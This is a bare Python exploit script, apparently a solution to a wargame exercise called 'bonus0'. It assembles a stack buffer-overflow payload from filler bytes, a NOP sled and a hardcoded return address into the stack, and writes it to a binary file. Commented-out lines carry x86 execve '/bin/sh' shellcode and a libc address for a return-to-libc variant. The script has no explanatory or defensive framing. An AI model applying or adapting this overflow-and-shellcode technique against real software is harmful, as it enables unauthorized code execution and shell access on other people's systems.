#!/usr/bin/env python3

from struct import pack

def isprint(c): return c >= 0x20 and c <= 0x7e
def p(x): return pack('<I', x)

# payload = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
# payload = p(0xb7e6b060)
payload = b"B" * 4095
payload += b'\n'
n = 14
payload += b'\x90' * n
payload += p(0xbffff4ea)
payload += b'\x90' * (20 - n - 4 - 1)
payload += b'\n'
# print(len(payload))

for c in payload:
    if isprint(c): print(chr(c), end='')
    else: print("\\x%02x" % c, end='')

with open("payload-bonus0.bin", "wb") as f:
    f.write(payload)
